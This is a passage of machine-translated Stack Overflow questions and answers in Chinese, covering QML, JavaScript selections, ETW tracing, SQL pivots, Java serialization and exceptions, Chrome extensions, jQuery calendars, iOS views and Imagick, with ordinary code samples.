                verticalAlignment: VerticalAlignment.Bottom
                topMargin: 60.0
                Label {
                    id: artist
                    text: "Artist"
                    horizontalAlignment: HorizontalAlignment.Center
                }
                Label {
                    id: song
                    text: "Track"
                    horizontalAlignment: HorizontalAlignment.Center
                }
                Label {
                    id: album
                    text: "Album"
                    horizontalAlignment: HorizontalAlignment.Center
                }
                Container {
                    layout: StackLayout {
                        orientation: LayoutOrientation.LeftToRight
                    }
                    Button {
                        text: "Previous"
                    }
                    Button {
                        text: "Pause"
                    }
                    Button {
                        text: "Next"
                    }
                }
                Slider {
                    verticalAlignment: VerticalAlignment.Bottom
                    horizontalAlignment: HorizontalAlignment.Center
                    fromValue: 0
                    toValue: 100
                }
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:47:53.280

我仍然不完全确定你想要实现什么，但是如果你想为项目的`text`属性定义一个别名属性，`artist`你犯了简单的拼写错误：`property alias artistText: artist.text`是定义别名的正确方法。别名定义的第二部分（点后面的部分）表示目标属性，通常以小写字母开头。

# javascript - 如何从 javascript 范围对象中获取 html 选择？

> ID：13328598
> 
> 赞同：1
> 
> 时间：2012-11-11T04:31:54.203
> 
> 标签：javascript, range, getselection

我有一个文件，我试图提取突出显示的文本和随附的 html 内容。使用 window.getSelection() 一切正常，但是当我需要提取特定的 html 内容时，事情开始变得棘手。

我正在尝试确定突出显示的文本是否已经穿过任何其他 html 标记的中途，但我能找到的所有提取 html 内容的方法似乎也在将 html 标记添加到以前不存在的文档中。这是一个问题，因为我需要知道用户对本机文档的选择。有人知道这个问题的解决方法吗？

我试过使用

```
var sel = window.getSelection().getRangeAt(0)
sel.cloneContents() 
```

然后从那里开始，但是当我在斜体节点中途测试它时，它总是返回额外的 html 标签。

我也尝试过使用 rangy 库

```
var sel = rangy.getSelection()
console.log(sel.toHtml()) 
```

但这返回了同样的问题。似乎任何返回 documentFragment 对象的方法似乎都会对所选文本做出假设，我需要避免这种情况。

有人有什么想法吗？我难住了。谢谢！

# c++ - 使用 ETW 在上下文切换时打印时间戳

> ID：13328601
> 
> 赞同：0
> 
> 时间：2012-11-11T04:32:37.297
> 
> 标签：c++, windows, visual-studio-2010, event-handling, etw

我正在使用在 Microsoft 网站上找到的以下代码。它编译成功并输出一个日志文件，因为它应该：

```
#include "stdafx.h"

#define INITGUID  // Include this #define to use SystemTraceControlGuid in Evntrace.h.

#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <strsafe.h>
#include <wmistr.h>
#include <evntrace.h>

#define LOGFILE_PATH L"C:\\Documents and Settings\\Administrator\\My Documents\\My Dropbox\\Log.etl"

void wmain(void)
{

    ULONG status = ERROR_SUCCESS;
    TRACEHANDLE SessionHandle = 0;
    EVENT_TRACE_PROPERTIES* pSessionProperties = NULL;
    ULONG BufferSize = 0;

    // Allocate memory for the session properties. The memory must
    // be large enough to include the log file name and session name,
    // which get appended to the end of the session properties structure.

    BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(LOGFILE_PATH) + sizeof(KERNEL_LOGGER_NAME);
    pSessionProperties = (EVENT_TRACE_PROPERTIES*) malloc(BufferSize);    
    if (NULL == pSessionProperties)
    {
        wprintf(L"Unable to allocate %d bytes for properties structure.\n", BufferSize);

        goto cleanup;
    }

    // Set the session properties. You only append the log file name
    // to the properties structure; the StartTrace function appends
    // the session name for you.

    ZeroMemory(pSessionProperties, BufferSize);
    pSessionProperties->Wnode.BufferSize = BufferSize;
    pSessionProperties->Wnode.Flags = WNODE_FLAG_TRACED_GUID;
    pSessionProperties->Wnode.ClientContext = 1; //QPC clock resolution
    pSessionProperties->Wnode.Guid = SystemTraceControlGuid; 
    pSessionProperties->EnableFlags = EVENT_TRACE_FLAG_CSWITCH;
    pSessionProperties->LogFileMode = EVENT_TRACE_FILE_MODE_CIRCULAR;
    pSessionProperties->MaximumFileSize = 5;  // 5 MB
    pSessionProperties->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    pSessionProperties->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(KERNEL_LOGGER_NAME); 
    StringCbCopy((LPWSTR)((char*)pSessionProperties + pSessionProperties->LogFileNameOffset), sizeof(LOGFILE_PATH), LOGFILE_PATH);

    // Create the trace session.

    status = StartTrace((PTRACEHANDLE)&SessionHandle, KERNEL_LOGGER_NAME, pSessionProperties);

    if (ERROR_SUCCESS != status)
    {
        if (ERROR_ALREADY_EXISTS == status)
        {
            wprintf(L"The NT Kernel Logger session is already in use.\n");
        }
        else
        {
            wprintf(L"EnableTrace() failed with %lu\n", status);
            getchar();
        }

        goto cleanup;
    }

    wprintf(L"Press any key to end trace session ");
    _getch();

cleanup:

    if (SessionHandle)
    {
        status = ControlTrace(SessionHandle, KERNEL_LOGGER_NAME, pSessionProperties, EVENT_TRACE_CONTROL_STOP);

        if (ERROR_SUCCESS != status)
        {
            wprintf(L"ControlTrace(stop) failed with %lu\n", status);
        }
    }

    if (pSessionProperties)
        free(pSessionProperties);
} 
```

我想知道是否有办法修改此代码以使其在检测到上下文切换时打印时间戳。有人有想法么？

# row - 将 2 行的数据合并为 1 行

> ID：13328611
> 
> 赞同：0
> 
> 时间：2012-11-11T04:34:16.553
> 
> 标签：row, pivot

我有一个非常复杂的查询。我希望 2 行数据合并为 1 行。

它给了我以下输出

```
 PNAME    RN         LVN        HA         MSW       SC
           AA     AG-1W      SS-1M     LO-2W      PA-1W      SK-1M
           AA     JL-1W      TD -1M     NULL      NULL       NULL 
```

有什么方法可以让我在 1 行中得到结果或将 2 行合并为 1。如下所示。

```
 PNAME      RN         LVN        HA        MSW         SC
             AA       AG-1W      SS-1M     LO-2W      PA-1W      SK-1M
                      JL-1W      TD -1M     NULL       NULL       NULL 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T14:10:41.203

目前尚不清楚您要实现的目标，但您可以实现使用 of`row_number()`以防止`pname`在其他行中显示：

```
select case when rownum = 1 then pname else '' end pname, 
    [RN], [LVN], [HA], [MSW], [SC]
from
(
    select pname, disc, value,
        ROW_NUMBER() over(partition by disc order by disc) rownum
    from temp
) src
pivot
(
    max(value)
    for disc in ([RN], [LVN], [HA], [MSW], [SC])
) piv 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/8fcdc/1)

结果：

```
| PNAME |    RN |   LVN |     HA |    MSW |     SC |
----------------------------------------------------
|    AA | AG-1W | SS-1M |  LO-2W |  PA-1W |  SK-1M |
|       | JL-1W | TD-1M | (null) | (null) | (null) | 
```

这使用 的值`row_number()`来决定是否`pname`应该显示 。它只会在 时显示该值`rownum=1`，否则它将为空白。

如果您希望数据在一行中，您可以使用类似于以下内容的内容：

```
;with cte as
(
  select pname, disc, value,
    ROW_NUMBER() over(partition by disc order by disc) rownum
  from temp
),
piv as 
(
  select * 
  from cte
  pivot
  (
    max(value)
    for disc in ([RN], [LVN], [HA], [MSW], [SC])
  ) piv
)
select pname,
  STUFF((SELECT distinct ', ' + [RN]  
              from piv p2
              where p1.pname = p2.pname
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'') RN,
  STUFF((SELECT distinct ', ' + [LVN]  
              from piv p2
              where p1.pname = p2.pname
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'') LVN,
  STUFF((SELECT distinct ', ' + [HA]  
              from piv p2
              where p1.pname = p2.pname
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'') HA,
  STUFF((SELECT distinct ', ' + [MSW]  
              from piv p2
              where p1.pname = p2.pname
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'') MSW,   
  STUFF((SELECT distinct ', ' + [SC]  
              from piv p2
              where p1.pname = p2.pname
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'') SC   
from piv p1
group by pname 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/8fcdc/16)

结果是：

```
| PNAME |            RN |           LVN |     HA |    MSW |     SC |
--------------------------------------------------------------------
|    AA |  AG-1W, JL-1W |  SS-1M, TD-1M |  LO-2W |  PA-1W |  SK-1M | 
```

# java - 在 Java 中使用序列化的最佳方法是什么？

> ID：13328612
> 
> 赞同：2
> 
> 时间：2012-11-11T04:34:35.393
> 
> 标签：java, serialization, io

我知道序列化是保存对象实例的一种快速方法，包括对象中的所有变量，不包括静态引用和用瞬态关键字标记的引用。

我不太擅长 I/O，我的应用程序有大约 50 个类，其中有三个不同的对象（其中包含对象）。

例如，我有一个*Animal Class*、*Employee Class*、*Vehicle Class*。所有这些都包含实例对象，在运行时，它们包含自己的子类、方法等。

我的问题是，用序列化保存所有这些信息的最简单方法是什么？*我已经和我的教授讨论过这个问题，他建议了一个类似于“ Data.class* ”的包含类的东西，它在所有东西中都有它的“手”，然后对其进行序列化。这最终会将它引用的每个对象保存到 .ser 文件。

我考虑过制作“ *Data.class* ”，然后制作我所有的 50 个类，扩展*Data*。然后让我的保存方法执行类似的操作

```
public void saveData(){
       Data myData = new Data()
try
      {
         FileOutputStream fileOut =
         new FileOutputStream("Data.ser");
         ObjectOutputStream out =
                            new ObjectOutputStream(fileOut);
         out.writeObject(myData);
         out.close();
          fileOut.close();
      }catch(IOException i)
      {
          i.printStackTrace();
      }
} 
```

但是，我似乎无法让它发挥作用。我相信这是因为我正在创建一个空白的 Data 实例，它只包含所有子类的默认值。当我确实打算保存时（在填充了相应对象中的所有值之后），我正在调用该函数，但是我做错了，无法弄清楚是什么。

任何帮助将不胜感激。当然，我不必手动序列化三种不同类型对象的每个实例吗？它超过300，我不想那样做。

另外，我确实给了 Data 一个 serialVersionID 并实现了 Data 的可序列化接口。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T04:39:50.550

确保您的所有类都实现了该`Serializable`接口，并且此类`Data`具有序列化/反序列化您的`Animal`、`Employee`和`Vehicle`其他类的方法。

您可以通过一个方法轻松地做到这一点`saveData(Serializable serializable, String fileName)`。这将是您需要的框架（基于您的实际代码）：

```
public class Data {

    public void saveData(Serializable serializable, String fileName) {
        try {
            FileOutputStream fileOut = new FileOutputStream(fileName);
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(myData);
            out.close();
            fileOut.close();
        } catch(IOException i) {
            i.printStackTrace();
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:42:15.097

将您不想序列化的任何变量标记为瞬态或静态。如果您需要更多信息或好奇，请查看[此处。](http://www.ibm.com/developerworks/library/j-serialtest/index.html)

# php - Chrome 扩展程序无法从非活动标签中获取标题

> ID：13328617
> 
> 赞同：3
> 
> 时间：2012-11-11T04:35:25.620
> 
> 标签：php, google-chrome

我有一个 Chrome 扩展程序，可以检查页面是否为 NYTimes.com。如果是这样，它会存储该页面的标题并通过 PHP 发送它。侦听器本身可以工作。我可以说是因为 PHP 端输出了一个时间戳。对于每个请求，都存在时间戳。

问题是当我通过按住 CTRL 打开选项卡时，它不是活动选项卡。所以一个空白字段被发送到我的 PHP 文件中，我不知道页面的标题。如何从已加载但不是活动窗口的页面中获取数据？

```
chrome.history.onVisited.addListener(function(result){
if (result.url.search("www.nytimes.com") >= 0 || result.url.search("nytimes.com") >= 0){
    title = result.title;
    $.post("http://myURL.com/tmp/test.php", {titletag: title});
    console.log("Saving "+result.title);
}
 }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-18T16:04:57.533

有一种解决方法可以做同样的事情：

在清单中声明一个 javascript 文件的注入：

```
"content_scripts": [{
    "matches": ["http://www.nytimes.com/*", "https://www.nytimes.com/*"],
    "js": ["my_script.js"],
    "run_at": "document_start"
}], 
```

你的 my_script.js ：

```
chrome.extension.sendRequest({'title':document.title}); 
```

在您的扩展主脚本中：

```
chrome.extension.onRequest.addListener(function(data) {
    $.post("http://myURL.com/tmp/test.php", {titletag: data.title});
} 
```

# java - 查找图像的平均颜色

> ID：13328619
> 
> 赞同：0
> 
> 时间：2012-11-11T04:35:55.100
> 
> 标签：java

我正在使用 a`BufferedImage`来保存 10 x 10 的图像样本。使用此图像，我想找到`Color`代表此图像的近似平均颜色（作为对象）。目前我对如何实现这个功能有两个想法：

1.  将图像的缩放实例制作成 1×1 大小的图像，并找到新创建的图像的颜色作为平均颜色
2.  使用两个 for 循环。最内层用于平均每条线，二级for循环用于逐像素平均每条线。

我真的很喜欢第一个解决方案的想法，但是我不确定它有多准确。第二种解决方案将与它们一样准确，但它似乎非常乏味。我也相信这个`getColor`命令在大规模上是处理器密集型的（我平均每秒执行 640 到 1920 次），如果我错了，请纠正我。由于这种方法会占用大量 CPU，因此我想使用一种相当有效的算法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:04:21.510

这取决于你所说的平均值。如果你有一半的像素是红色的，一半的像素是蓝色的，那么平均值会是紫色吗？在这种情况下，我认为您可以尝试将所有值相加并将其除以您拥有的像素数。

但是，我怀疑您想要主色而不是平均值？

在这种情况下，一种替代方法是将颜色离散化为“桶”（例如以 100 个间隔，或者在极端情况下甚至更稀疏，只有 3 个，一个用于红色，一个用于绿色，一个用于蓝色），并创建一个直方图（一个带计数的简单数组）。然后，您将取出计数最多的桶。

小心想法 1。请记住，缩放通常是通过采样进行的。由于您的图像非常小，因此您已经丢失了很多信息。进一步缩小可能只会采样几个像素，而不是真正平均所有像素。更好地检查您的缩放过程使用的是什么算法。

# java - 我如何询问“如果有异常，那么执行此操作”java

> ID：13328620
> 
> 赞同：-5
> 
> 时间：2012-11-11T04:36:11.623
> 
> 标签：java, exception, exception-handling

我想问如果发生异常，然后在文本字段中显示某个字符串。当我尝试使用 try, catch IOException 时，它给了我一个错误，该错误不能在与 try 相同的主体中捕获。这可能应该在执行的操作方法中完成。

图形用户界面：

```
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.util.ArrayList;

public class GUI extends JFrame implements ActionListener
{
JPanel buttonPanel, topPanel, operationPanel;
JTextField display = new JTextField(20);

doMath math = new doMath();
String s = "";
String b= "";
//int counter;

JButton Num1;
JButton Num2;
JButton Num3;
JButton Num4;
JButton Num5;
JButton Num6;
JButton Num7;
JButton Num8;
JButton Num9;
JButton Num0;

JButton Add;
JButton Sub;
JButton Mult;
JButton Div;
JButton Eq;
JButton Clr;
JButton Space;
public GUI()
{
    super("Calculator");
    setSize(400,400);
    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    JPanel mainPanel = new JPanel();
    mainPanel.setLayout(new GridLayout (2,1));

    buttonPanel = new JPanel();        
    buttonPanel.setLayout(new GridLayout(5, 4));
    buttonPanel.add(Num1 = new JButton("1"));
    buttonPanel.add(Num2 = new JButton("2"));
    buttonPanel.add(Num3 = new JButton("3"));
    buttonPanel.add(Num4 = new JButton("4"));
    buttonPanel.add(Num5 = new JButton("5"));
    buttonPanel.add(Num6 = new JButton("6"));
    buttonPanel.add(Num7 = new JButton("7"));
    buttonPanel.add(Num8 = new JButton("8"));
    buttonPanel.add(Num9 = new JButton("9"));
    buttonPanel.add(Num0 = new JButton("0"));        
    buttonPanel.add(Clr = new JButton("C"));
    buttonPanel.add(Eq = new JButton("="));
    buttonPanel.add(Add = new JButton("+"));
    buttonPanel.add(Sub = new JButton("-"));
    buttonPanel.add(Mult = new JButton("*"));
    buttonPanel.add(Div = new JButton("/"));
    buttonPanel.add(Space = new JButton("Space")); 

    Num1.addActionListener(this);
    Num2.addActionListener(this);
    Num3.addActionListener(this);
    Num4.addActionListener(this);
    Num5.addActionListener(this);
    Num6.addActionListener(this);
    Num7.addActionListener(this);
    Num8.addActionListener(this);
    Num9.addActionListener(this);
    Num0.addActionListener(this);
    Clr.addActionListener(this);
    Eq.addActionListener(this);
    Add.addActionListener(this);
    Sub.addActionListener(this);
    Mult.addActionListener(this);
    Div.addActionListener(this);
    Space.addActionListener(this);

    topPanel = new JPanel();         
    topPanel.setLayout(new FlowLayout());
    topPanel.add(display);

    add(mainPanel);

    mainPanel.add(topPanel, BorderLayout.NORTH);
    mainPanel.add(buttonPanel, BorderLayout.SOUTH);

    setVisible(true);

}

public void actionPerformed(ActionEvent e) 
{
    JButton source = (JButton)e.getSource();
    String text = source.getText();

try{
    if (text.equals("=")) 
    {
        doMath math = new doMath();

        b = b.replaceAll("\\s+", " ");

        int result = math.doMath1(b);

        String answer = ""+result;
        display.setText(answer);

    }

    else if(text.equals("Space"))
    {        

            b+=" ";
            display.setText(b);

    }

    else if (text.equals("C"))
    {
        b = "";

        display.setText(b);
    }
    else if (text.equals("+") || text.equals("-") || text.equals("*") ||     text.equals("/"))
    {
         b += (" "+(text)+ " ");

        display.setText(b);
    }
    else 
    {

        b += (text);

        display.setText(b);

    }
    }
catch(IOException o)
{display.setText(b);} 

}
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-11T04:42:18.980

> 当我尝试使用 try, catch IOException 时，它给了我一个错误，它不能在与 try 相同的主体中具有 catch

该错误是不言自明的。以下代码是非法的：

```
try{  
    catch(Exception ex){  
         }  
   } 
```

你要这个：

```
try{  
    //stuff i need to do  
   } //close the try  
  catch(IOException ioex)  
  {  
     //log and recover  
  } 
```

**=更新**

基于下面的代码块（与 OP 所说的相同，以防以后更改）实际显示的错误消息是这样的：

> IOException 无法到达的 catch 块。try 语句体 GUI.java 永远不会抛出此异常

发生这种情况的原因是`IOException`您的代码中没有任何内容会生成 ，您可以定义的唯一异常是顶级的，而无需从您的函数之一显式抛出`Exception`。

```
public class GUI extends JFrame implements ActionListener
{
JPanel buttonPanel, topPanel, operationPanel;
JTextField display = new JTextField(20);

doMath math = new doMath();
String s = "";
String b= "";
//int counter;

JButton Num1;
JButton Num2;
JButton Num3;
JButton Num4;
JButton Num5;
JButton Num6;
JButton Num7;
JButton Num8;
JButton Num9;
JButton Num0;

JButton Add;
JButton Sub;
JButton Mult;
JButton Div;
JButton Eq;
JButton Clr;
JButton Space;
public GUI()
{
    super("Calculator");
    setSize(400,400);
    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    JPanel mainPanel = new JPanel();
    mainPanel.setLayout(new GridLayout (2,1));

    buttonPanel = new JPanel();        
    buttonPanel.setLayout(new GridLayout(5, 4));
    buttonPanel.add(Num1 = new JButton("1"));
    buttonPanel.add(Num2 = new JButton("2"));
    buttonPanel.add(Num3 = new JButton("3"));
    buttonPanel.add(Num4 = new JButton("4"));
    buttonPanel.add(Num5 = new JButton("5"));
    buttonPanel.add(Num6 = new JButton("6"));
    buttonPanel.add(Num7 = new JButton("7"));
    buttonPanel.add(Num8 = new JButton("8"));
    buttonPanel.add(Num9 = new JButton("9"));
    buttonPanel.add(Num0 = new JButton("0"));        
    buttonPanel.add(Clr = new JButton("C"));
    buttonPanel.add(Eq = new JButton("="));
    buttonPanel.add(Add = new JButton("+"));
    buttonPanel.add(Sub = new JButton("-"));
    buttonPanel.add(Mult = new JButton("*"));
    buttonPanel.add(Div = new JButton("/"));
    buttonPanel.add(Space = new JButton("Space")); 

    Num1.addActionListener(this);
    Num2.addActionListener(this);
    Num3.addActionListener(this);
    Num4.addActionListener(this);
    Num5.addActionListener(this);
    Num6.addActionListener(this);
    Num7.addActionListener(this);
    Num8.addActionListener(this);
    Num9.addActionListener(this);
    Num0.addActionListener(this);
    Clr.addActionListener(this);
    Eq.addActionListener(this);
    Add.addActionListener(this);
    Sub.addActionListener(this);
    Mult.addActionListener(this);
    Div.addActionListener(this);
    Space.addActionListener(this);

    topPanel = new JPanel();         
    topPanel.setLayout(new FlowLayout());
    topPanel.add(display);

    add(mainPanel);

    mainPanel.add(topPanel, BorderLayout.NORTH);
    mainPanel.add(buttonPanel, BorderLayout.SOUTH);

    setVisible(true);

}

public void actionPerformed(ActionEvent e) 
{
    JButton source = (JButton)e.getSource();
    String text = source.getText();

try{
    if (text.equals("=")) 
    {
        doMath math = new doMath();

        b = b.replaceAll("\\s+", " ");

        int result = math.doMath1(b);

        String answer = ""+result;
        display.setText(answer);

    }

    else if(text.equals("Space"))
    {        

            b+=" ";
            display.setText(b);

    }

    else if (text.equals("C"))
    {
        b = "";

        display.setText(b);
    }
    else if (text.equals("+") || text.equals("-") || text.equals("*") ||     text.equals("/"))
    {
         b += (" "+(text)+ " ");

        display.setText(b);
    }
    else 
    {

        b += (text);

        display.setText(b);

    }
    }
catch(IOException o)
{display.setText(b);} 

}
} 
```

# android - 安卓点击游戏教程

> ID：13328621
> 
> 赞同：3
> 
> 时间：2012-11-11T04:36:15.600
> 
> 标签：android, game-engine

我正在寻找一个关于安卓点击游戏的教程。我查看了这篇文章中的评论： [resource-on-making-a-point-and-click-game-no-flash](https://stackoverflow.com/questions/11064215/resource-on-making-a-point-and-click-game-no-flash)

发布的链接与android没有任何关系。我还阅读了： [android游戏教程](http://obviam.net/index.php/getting-started-in-android-game-development-with-libgdx-create-a-working-prototype-in-a-day-tutorial-part-1/)

然而，它不是一个点击游戏。因此，我正在寻找专门针对 android 平台的指向和点击游戏的教程。

编辑：通过“点击”，我指的是类似于PC的游戏风格。但是，我不想要鼠标指针，这在 Android 上会很奇怪。我只是希望用户能够触摸游戏屏幕上的各种小部件/对象，并与它们进行交互（通过点击它们）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T06:16:26.177

[Construct 2](http://www.scirra.com/construct2)是一个很好的起点。他们有很多专门针对 Android 开发的[教程](http://scirra.com/tutorials)，而且他们的初学者教程有不同的版本（自上而下、横向滚动等），这将使您对软件有很好的了解。他们平台的免费版本涵盖了大部分内容。付费版本有额外的层，非常适合更高级的技巧。您还应该查看他们的展示游戏，看看[其他人为 Andriod 做了什么](http://www.scirra.com/forum/construct-2-and-android_topic53409.html)。

初学者教程足以弄清楚大多数点击操作的工作原理。[初学者教程的第 5 页](http://scirra.com/tutorials/37/beginners-guide-to-construct-2/page-5.)有第一个鼠标单击事件。还有一种方法可以设置在单击对象时发生的事件（例如，当您单击怪物时，它会死亡）。[这是一个易于遵循的 Whack A Mole](http://scirra.com/forum/whack-a-mole-game-construct-2_topic43554.html)。通常你首先构建完整的游戏。然后，您将进入[Android 教程](http://developer.android.com/guide/webapps/webview.html)，添加在 Android 上运行所需的所有内容。对于熟练的开发人员来说，这是一个简单的过程，但它需要您冒险脱离 Construct 2 等用户友好的点击式游戏构建工具包。

从开发人员的角度来看，最好的选择是 Java。它可能是目前最适合 Android 的语言。在大多数情况下，它将是最稳定、最快和最容易学习的。此外，它对用户的要求最少（例如，用户不需要自定义浏览器或 Jetpack、Air 或任何东西——用户不需要安装除您的应用程序以外的任何东西）。今天，谷歌上的热门话题在这里：[http](http://www.javacodegeeks.com/2011/06/android-game-development-tutorials.html) ://www.javacodegeeks.com/2011/06/android-game-development-tutorials.html 。

还有其他易于查找的地方，您可以阅读有关开始使用 Java 进行 Android 游戏开发的信息——这意味着这个问题可能会被关闭。这将需要阅读其他人的代码，并且您可能应该从熟悉 Java 开始。在您花费大量时间学习 Java 之后，您可以阅读教程并理解它们，并通过针对各种代码的不同自定义和应用程序获得创意。YouTube 上的热门游戏是一个指向并摧毁的、Whack-a-Mole 类型的游戏，例如，它的源代码可能适合您的目的。不过，我不能完全通过您的描述来判断，因为人们通常不会点击，除非他们使用鼠标，而 Android 不使用鼠标 afaik。:) 你应该考虑更新你的问题并进入一些坚韧不拔的细节。

# jquery - 在使用 jQuery 将数据刷新到 div 时，它会给出重复值

> ID：13328622
> 
> 赞同：1
> 
> 时间：2012-11-11T04:36:44.457
> 
> 标签：jquery

在我当前的项目中，我正在使用 jQuery 日历插件，你可以看到它的演示

[http://www.web-delicious.com/jquery-plugins-demo/wdCalendar/sample.php](http://www.web-delicious.com/jquery-plugins-demo/wdCalendar/sample.php)。

现在，问题是每当我尝试通过单击刷新按钮来刷新数据时，它都会给我重复的值。在这里，我给你刷新之前和刷新之后我的项目的截图，它可能对你有用。

[刷新前](http://i.stack.imgur.com/ej1ds.png)

[刷新后](http://i.stack.imgur.com/9gbBI.png)

在第二张图片中，您可以看到每个数据出现重复。每次我单击刷新按钮时，它都会出现重复数据，但在重新加载整个页面时，它会给我作为第一张图片。

我正在使用以下代码进行刷新。在刷新按钮单击事件

```
$("#showreflashbtn").click(function (e) {
    $("#gridcontainer").reload();
}); 
```

数据来自数据库，我认为问题是新数据来了，但是已经在浏览器中的数据没有清除，所以它变成了重叠。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-06-24T14:01:55.590

在添加新数据之前，您需要先清除日历数据。在重新加载之前尝试以下代码：

```
$("#gridcontainer").empty(); 
```

您可以在此处找到 wdCalendar 插件的文档：[文档](http://www.web-delicious.com/jquery-plugins-demo/wdCalendar/docs/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-03-23T10:45:31.693

为了防止重复事件，请执行以下操作：

在 jquery.calendar.js 文件中转到该`populate()`函数。在 ajax 成功函数中添加以下行：

```
option.eventItems = new Array(); 
```

这肯定会删除所有事件并防止重复。

完整代码：

```
$.ajax({
                type: option.method, 
                url: option.url,
                data: param,
                dataType: "json",
                dataFilter: function(data, type) {
                    return data;
                },
                success: function(data) {//function(datastr) {                                  
                    option.eventItems = new Array(); // Without this line there will be duplicates

                    if (data != null && data.error != null) {
                        if (option.onRequestDataError) {
                            option.onRequestDataError(1, data);
                        }
                    }
                    else {
                        // Good response
                        data["start"] = parseDate(data["start"]);
                        data["end"] = parseDate(data["end"]);
                        $.each(data.events, function(index, value) { 
                            value[2] = parseDate(value[2]);
                            value[3] = parseDate(value[3]); 
                        });
                        responseData(data, data.start, data.end);
                        pushER(data.start, data.end);
                    }
                    if (option.onAfterRequestData && $.isFunction(option.onAfterRequestData)) {
                        option.onAfterRequestData(1);
                    }
                    option.isloading = false;
                },
                error: function(data) { 
                    try {                           
                        if (option.onRequestDataError) {
                            option.onRequestDataError(1, data);
                        } else {
                            alert(i18n.xgcalendar.get_data_exception);
                        }
                        if (option.onAfterRequestData && $.isFunction(option.onAfterRequestData)) {
                            option.onAfterRequestData(1);
                        }
                        option.isloading = false;
                    } catch (e) { }
                }
            }); 
```

我希望它会帮助你

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-09-12T18:48:20.380

我遇到了与您在此处描述的相同的问题。我发现我的问题是我必须通过 StartTime 从数据库 order 中获取我的事件数据，这将有助于 wdcalendar javascript 代码正确清除事件。希望对你有帮助！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-06-25T05:01:07.117

```
$("#showreflashbtn").click(function(e){
                $("#gridcontainer").empty();
                $("#gridcontainer").reload();
                $('.filterevents').removeClass('fcurrent');

            }); 
```

试试这个它对我有用

# iphone - 设置背景图像和使用 UIImageView 的问题

> ID：13328623
> 
> 赞同：0
> 
> 时间：2012-11-11T04:36:50.760
> 
> 标签：iphone, objective-c, ios, xcode, uiimageview

在我的 iPhone 应用程序上，我只想设置一个特定的背景图像，这取决于它是否是 iPhone 5。

所以，我尝试了两种方法：A）使用

```
self.view.backgroundColor = [UIColor colorWithPatternImage:backGroundimage]; 
```

B）创建一个 UIImageView 并在那里设置图像。代码：

```
UIImageView *backgroundImageView = [[UIImageView alloc]initWithFrame:screenBounds];
[backgroundImageView setImage:[UIImage imageNamed:backGroundImage]];
[self.view addSubview:backgroundImageView]; 
```

但我对他们两个都有问题：

步骤 A 的问题：当我通过这种方式设置图像时，我必须处理不同屏幕尺寸的图像缩放问题。我使用以下代码进行缩放：

```
UIGraphicsBeginImageContext(screenBounds.size);
[[UIImage imageNamed:backGroundImage] drawInRect:screenBounds];
UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext(); 

self.view.backgroundColor = [UIColor colorWithPatternImage:image]; 
```

步骤 A 的另一个问题是图像看起来很模糊。它没有相同的锐度。

步骤 B 的问题：有了这个，图像看起来非常清晰和锐利 - 就像它应该看起来的那样。

但是当我使用以下代码切换到另一个视图时，奇怪的是 UIImageView backgroundImageView 仍然出现在第二个视图上。我用来切换视图的代码是：

```
[self presentViewController:secondViewController animated:YES completion:nil]; 
```

我什至尝试过`[backgroundImageView removeFromSuperview]`，但这也没有解决任何问题。

那么我做错了什么？以及如何将图片设置为取决于 iphone 大小的背景？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:25:33.953

B计划是个好计划。呈现另一个视图控制器应该并且肯定会隐藏您的图像视图。如果它没有发生，那么它是创建 secondViewController 的问题，与当前 VC 上的背景图像无关。

在呈现 secondViewController 之前，记录它：

```
NSLog(@"presenting %@", secondViewController); 
```

我赌一美元，它是零。如果我是对的，让我们看看如何初始化 secondViewController。这就是问题所在，与背景图像视图无关。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T13:12:11.660

好的，我终于解决了这个问题，虽然这个问题的原因仍然让我感到困惑。

为了解决这个问题，我必须为 UIImageView 创建一个 IBOutlet 属性并将其连接到 XIB 文件上。

我以编程方式创建 UIImageView 的原因是 UIImageView 的大小取决于他们使用的 iPhone 大小。但是对于 IBOutlet（我们称之为 UIImageViewOutlet，我只是使用 [self.UIImageViewOutlet setFrame:] 来获得我想要的大小和位置。

我还发现我以编程方式创建的按钮之一在 secondViewController 中仍然可见。我最终在 XIB 文件上也为该文件创建了一个 Outlet，并在其上使用了 setFrame 来正确定位它。

如果有人知道这个问题的原因，我将非常感激。

# php - 当我使用 Imagick::annotateImage() 时如何注释单引号？

> ID：13328626
> 
> 赞同：2
> 
> 时间：2012-11-11T04:37:27.713
> 
> 标签：php

如果我在图像上注释单引号，我将输出如下：`I\'m cool`

```
